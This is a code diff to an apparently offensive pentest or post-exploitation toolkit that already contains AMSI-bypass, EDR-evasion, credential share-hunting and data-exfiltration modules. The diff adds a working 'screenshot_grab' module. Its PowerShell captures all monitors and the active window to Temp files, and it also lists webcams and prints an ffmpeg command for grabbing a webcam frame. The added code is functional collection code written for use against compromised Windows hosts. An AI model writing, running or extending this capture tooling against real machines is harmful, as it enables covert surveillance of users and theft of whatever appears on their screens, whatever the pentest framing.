@@ -487,6 +487,11 @@ const PROGRAMS = {
       "Verify stealth encoding modes are working — runs a benign test command through each encoding mode (plain, base64, amsi-bypass, obfuscate) and reports which ones execute successfully. Use before real operations to confirm AV/EDR evasion readiness",
     args: "[--mode base64|amsi|obfuscate|all]",
   },
+  screenshot_grab: {
+    description:
+      "Screen and visual capture — take screenshots of all monitors, capture active window, optional webcam snapshot via DirectShow API. Used for visual intelligence gathering and proving access during pentest engagements",
+    args: "--action screen|window|webcam|all [--output PATH] [--monitor INDEX]",
+  },
   share_hunt: {
     description:
       "Network share hunting — discover and enumerate SMB shares across the network, scan for sensitive files (credentials, configs, backups, scripts, databases, SSH keys, certificates), identify open/readable/writable shares, find password files in SYSVOL/NETLOGON/IT shares, detect misconfigured share permissions. Targets: specific host, subnet, or domain computers via AD query",
@@ -13885,6 +13890,158 @@ async function stealthCheck(args: string[], timeout: number): Promise<HookResult
   return { output: output.join("\n"), findings }
 }
 
+async function screenshotGrab(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "screen"
+  const outputPath = argVal(args, "--output") || `${process.env.TEMP || "C:\\Windows\\Temp"}\\cs-capture-${Date.now()}`
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Visual capture operations...\n"]
+
+  if (action === "screen" || action === "all") {
+    const script = `
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+Write-Output "=== Screenshot Capture ==="
+
+$screens = [System.Windows.Forms.Screen]::AllScreens
+Write-Output "[*] Monitors detected: $($screens.Count)"
+
+$index = 0
+foreach ($screen in $screens) {
+    $bounds = $screen.Bounds
+    Write-Output "[*] Monitor $index : $($bounds.Width)x$($bounds.Height) at ($($bounds.X),$($bounds.Y)) $(if ($screen.Primary) { '(PRIMARY)' })"
+
+    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
+    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+
+    $filePath = "${outputPath}-monitor$index.png"
+    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
+    $fileSize = (Get-Item $filePath).Length
+    Write-Output "[+] Saved: $filePath ($([math]::Round($fileSize/1KB, 1)) KB)"
+
+    $graphics.Dispose()
+    $bitmap.Dispose()
+    $index++
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-CAPTURE-001",
+      provider: "windows",
+      severity: "medium",
+      status: "EXECUTED",
+      resource: "display://screenshot",
+      title: "Screenshots captured from all monitors",
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor for GDI+ screen capture API calls. Restrict unnecessary access to graphical sessions.",
+    })
+  }
+
+  if (action === "window" || action === "all") {
+    const script = `
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+
+public class WinCapture {
+    [DllImport("user32.dll")]
+    public static extern IntPtr GetForegroundWindow();
+
+    [DllImport("user32.dll")]
+    public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
+
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct RECT {
+        public int Left, Top, Right, Bottom;
+    }
+}
+"@
+
+Write-Output "=== Active Window Capture ==="
+
+$hwnd = [WinCapture]::GetForegroundWindow()
+$title = New-Object System.Text.StringBuilder 256
+[WinCapture]::GetWindowText($hwnd, $title, 256) | Out-Null
+
+$rect = New-Object WinCapture+RECT
+[WinCapture]::GetWindowRect($hwnd, [ref]$rect) | Out-Null
+
+$width = $rect.Right - $rect.Left
+$height = $rect.Bottom - $rect.Top
+
+Write-Output "[*] Active window: $($title.ToString())"
+Write-Output "[*] Size: $($width)x$($height)"
+
+$bitmap = New-Object System.Drawing.Bitmap($width, $height)
+$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+$graphics.CopyFromScreen($rect.Left, $rect.Top, 0, 0, (New-Object System.Drawing.Size($width, $height)))
+
+$filePath = "${outputPath}-window.png"
+$bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
+Write-Output "[+] Saved: $filePath ($([math]::Round((Get-Item $filePath).Length/1KB, 1)) KB)"
+
+$graphics.Dispose()
+$bitmap.Dispose()
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-CAPTURE-002",
+      provider: "windows",
+      severity: "medium",
+      status: "EXECUTED",
+      resource: "display://active-window",
+      title: "Active window screenshot captured",
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor for unusual screen capture API usage. DLP solutions can detect screenshot operations.",
+    })
+  }
+
+  if (action === "webcam" || action === "all") {
+    const script = `
+Write-Output "=== Webcam Detection ==="
+
+$devices = Get-WmiObject Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Camera' -or $_.PNPClass -eq 'Image' -or $_.Name -match 'cam|video|webcam' }
+
+if ($devices) {
+    Write-Output "[*] Camera devices found:"
+    foreach ($d in $devices) {
+        Write-Output "    $($d.Name) — $($d.Status)"
+    }
+    Write-Output ""
+    Write-Output "[*] Webcam capture requires ffmpeg or DirectShow COM interop"
+    Write-Output "[*] Install ffmpeg and use: ffmpeg -f dshow -i video='DEVICE_NAME' -frames:v 1 webcam.jpg"
+} else {
+    Write-Output "[-] No camera devices detected"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-CAPTURE-003",
+      provider: "windows",
+      severity: "info",
+      status: "ENUMERATED",
+      resource: "device://webcam",
+      title: "Webcam device detection",
+      details: r.stdout.substring(0, 500),
+      remediation: "Disable unused camera devices. Monitor camera access via device auditing.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 async function shareHunt(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "enum"
   const target = argVal(args, "--target") || "domain"
@@ -19913,6 +20070,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   backup_operator_abuse: backupOperatorAbuse,
   applocker_bypass: applockerBypass,
   stealth_check: stealthCheck,
+  screenshot_grab: screenshotGrab,
   share_hunt: shareHunt,
   data_exfil: dataExfil,
   firewall_manage: firewallManage,
